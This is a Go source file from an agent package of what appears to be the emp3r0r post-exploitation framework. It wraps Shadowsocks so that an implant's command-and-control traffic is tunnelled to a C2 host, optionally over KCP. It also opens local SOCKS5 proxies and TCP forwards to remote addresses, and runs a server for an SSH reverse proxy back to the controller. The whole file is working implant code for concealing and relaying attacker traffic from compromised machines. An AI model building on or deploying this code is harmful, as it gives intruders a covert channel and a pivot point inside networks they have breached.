package agent

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// SS_Ctx, SS_Cancel context for Shadowsocks client, call SS_Cancel() to stop existing Shadowsocks client
var SS_Ctx, SS_Cancel = context.WithCancel(context.Background())

func startShadowsocksClient(ss_serverAddr, localSocksAddr, tcptun string) {
	ss_config := createSSConfig(ss_serverAddr, localSocksAddr, tcptun, false)
	err := tun.SSMain(ss_config)
	if err != nil {
		log.Printf("ShadowsocksProxy failed to start: %v", err)
		return
	}

	defer func() {
		log.Printf("Shadowsocks client (%v) exited", ss_config)
		ss_config.Cancel()
	}()

	for ss_config.Ctx.Err() == nil {
		time.Sleep(time.Second)
	}
}

func createSSConfig(serverAddr, localSocksAddr, tcptun string, isServer bool) *tun.SSConfig {
	return &tun.SSConfig{
		ServerAddr:     serverAddr,
		LocalSocksAddr: localSocksAddr,
		Cipher:         tun.SSAEADCipher,
		Password:       RuntimeConfig.Password,
		IsServer:       isServer,
		Verbose:        false,
		TCPTun:         tcptun,
		Ctx:            SS_Ctx,
		Cancel:         SS_Cancel,
	}
}

// Start ShadowsocksC2Client client, you get a SOCKS5 proxy server at 127.0.0.1:Runtime.ShadowsocksPort
// This proxy server is responsible for encapsulating C2 traffic
func ShadowsocksC2Client() {
	ss_server_port := RuntimeConfig.ShadowsocksServerPort
	ss_server_addr := RuntimeConfig.CCHost
	if RuntimeConfig.UseKCP {
		log.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
		ss_server_port = RuntimeConfig.KCPClientPort
		ss_server_addr = "127.0.0.1"
	} else {
		log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
			RuntimeConfig.CCHost,
			RuntimeConfig.ShadowsocksServerPort)
	}

	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)
	local_socks_addr := "127.0.0.1:" + RuntimeConfig.ShadowsocksLocalSocksPort

	startShadowsocksClient(server_addr, local_socks_addr, "")
}

// Start ShadowsocksLocalSocks client, you get a SOCKS5 proxy server at lport
func ShadowsocksLocalSocks(ss_server, lport string) {
	log.Printf("ShadowsocksLocalSocks: %s:%s", ss_server, lport)
	ss_server_port := RuntimeConfig.ShadowsocksServerPort
	ss_server_ip := ss_server

	ss_server_addr := fmt.Sprintf("%s:%s", ss_server_ip, ss_server_port)

	local_socks_addr := "127.0.0.1:" + lport
	startShadowsocksClient(ss_server_addr, local_socks_addr, "")
}

// Start ShadowsocksTCPTunnel to connect to Shadowsocks server and forward traffic to a specified remote address
// tcptun: "local_port=remote_host:remote_port,local_port=remote_host:remote_port"
func ShadowsocksTCPTunnel(ss_server, lport, raddr string) {
	ss_server_port := RuntimeConfig.ShadowsocksServerPort
	ss_server_ip := ss_server

	ss_server_addr := fmt.Sprintf("%s:%s", ss_server_ip, ss_server_port)

	tcptun := fmt.Sprintf("127.0.0.1:%s=%s", lport, raddr)
	startShadowsocksClient(ss_server_addr, "", tcptun)
}

// Start Shadowsocks proxy server with RuntimeConfig.ShadowsocksPassword
// This server will serve as a secure tunnel that encapsulates SOCKS5 service provider
// for both broadcasted proxy server and `bring2cc` SSH reverse proxy
func ShadowsocksServer() error {
	ctx, cancel := context.WithCancel(context.Background())
	ss_config := createSSConfig("0.0.0.0:"+RuntimeConfig.ShadowsocksServerPort, "", "", true)
	ss_config.Ctx = ctx
	ss_config.Cancel = cancel

	// start server
	log.Printf("Shadowsocks Server: %v", ss_config)

	err := tun.SSMain(ss_config)
	if err != nil {
		return fmt.Errorf("shadowsocksServer: %v", err)
	}

	return nil
}
